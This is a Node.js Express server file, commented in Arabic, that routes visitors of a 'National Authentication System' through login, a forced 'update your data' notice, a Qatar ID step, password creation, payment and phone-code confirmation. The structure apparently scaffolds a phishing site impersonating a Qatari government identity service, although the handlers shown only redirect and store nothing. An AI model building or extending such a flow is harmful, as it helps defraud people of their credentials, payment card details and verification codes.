const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// إعداد EJS كـ template engine
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// خدمة الملفات الثابتة من مجلد public (للصور، CSS، إلخ)
app.use(express.static(path.join(__dirname, 'public')));

// Middleware لمعالجة البيانات
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Routes للصفحات

// الصفحة الرئيسية
app.get('/', (req, res) => {
  res.render('index', {
    title: 'نظام التوثيق الوطني',
    currentPage: 'index'
  });
});

// صفحة تسجيل الدخول
app.get('/login', (req, res) => {
  res.render('login', {
    title: 'تسجيل الدخول - نظام التوثيق الوطني',
    currentPage: 'login',
    currentStep: 0
  });
});

// معالجة تسجيل الدخول (POST) - يوجه إلى صفحة التنبيه
app.post('/login', (req, res) => {
  // هنا يمكن إضافة منطق التحقق من بيانات الدخول
  // بعد تسجيل الدخول الناجح، نوجه إلى صفحة التنبيه
  res.redirect('/update-notice');
});

// صفحة التنبيه (يجب تحديث بياناتك)
app.get('/update-notice', (req, res) => {
  res.render('update-notice', {
    title: 'تنبيه - نظام التوثيق الوطني',
    currentPage: 'update-notice',
    currentStep: 0
  });
});

// الخطوة الأولى
app.get('/step1', (req, res) => {
  res.render('step1', {
    title: 'الخطوة الأولى - نظام التوثيق الوطني',
    currentPage: 'step1',
    currentStep: 1
  });
});

// الخطوة الثانية
app.get('/step2', (req, res) => {
  res.render('step2', {
    title: 'الخطوة الثانية - نظام التوثيق الوطني',
    currentPage: 'step2',
    currentStep: 2
  });
});

// الخطوة الثانية - نسخة قطر (step2Q)
app.get('/step2Q', (req, res) => {
  const userType = req.query.type || 'QID'; // افتراضي: قطري/مقيم
  res.render('step2Q', {
    title: 'الخطوة الثانية - نظام التوثيق الوطني',
    currentPage: 'step2Q',
    userType: userType,
    currentStep: 2
  });
});

// الخطوة الثالثة - إنشاء كلمة المرور
app.get('/step3', (req, res) => {
  res.render('step3', {
    title: 'إنشاء كلمة المرور - نظام التوثيق الوطني',
    currentPage: 'step3',
    currentStep: 3
  });
});

app.post('/step3', (req, res) => {
  res.redirect('/step4');
});

// الخطوة الرابعة - التسديد
app.get('/step4', (req, res) => {
  res.render('step4', {
    title: 'التسديد - نظام التوثيق الوطني',
    currentPage: 'step4',
    currentStep: 4
  });
});

app.post('/step4', (req, res) => {
  res.redirect('/step5');
});

// الخطوة الخامسة - توثيق رقم الهاتف
app.get('/step5', (req, res) => {
  res.render('step5', {
    title: 'توثيق رقم الهاتف - نظام التوثيق الوطني',
    currentPage: 'step5',
    currentStep: 5
  });
});

app.post('/step5', (req, res) => {
  res.redirect('/step6');
});

// الخطوة السادسة - إتمام التسجيل
app.get('/step6', (req, res) => {
  res.render('step6', {
    title: 'تأكيد رقم الهاتف - نظام التوثيق الوطني',
    currentPage: 'step6',
    currentStep: 6
  });
});

app.get('/step7', (req, res) => {
  res.render('step7', {
    title: 'إتمام التسجيل - نظام التوثيق الوطني',
    currentPage: 'step7',
    currentStep: 7
  });
});

// معالجة جميع الطلبات الأخرى
app.use((req, res) => {
  res.status(404).send('Page not found');
});

app.listen(PORT, () => {
  console.log(`✅ Server is running on http://localhost:${PORT}`);
  console.log(`\n📄 Available pages:`);
  console.log(`   - http://localhost:${PORT}/              (الصفحة الرئيسية)`);
  console.log(`   - http://localhost:${PORT}/login         (تسجيل الدخول)`);
  console.log(`   - http://localhost:${PORT}/update-notice (تنبيه التحديث)`);
  console.log(`   - http://localhost:${PORT}/step1         (الخطوة الأولى)`);
  console.log(`   - http://localhost:${PORT}/step2         (الخطوة الثانية)`);
  console.log(`   - http://localhost:${PORT}/step2Q        (الخطوة الثانية - قطر)`);
  console.log(`   - http://localhost:${PORT}/step3         (الخطوة الثالثة - كلمة المرور)`);
  console.log(`   - http://localhost:${PORT}/step4         (الخطوة الرابعة - التسديد)`);
  console.log(`   - http://localhost:${PORT}/step5         (الخطوة الخامسة - توثيق الهاتف)`);
  console.log(`   - http://localhost:${PORT}/step6         (الخطوة السادسة - إتمام التسجيل)`);
  console.log(`\n🎨 Using EJS templates (Dynamic Node.js)`);
  console.log(`\n🔗 Workflow Path:`);
  console.log(`   / → /login → /update-notice → /step1 → /step3 → /step2Q → /step4 → /step5 → /step6`);
});
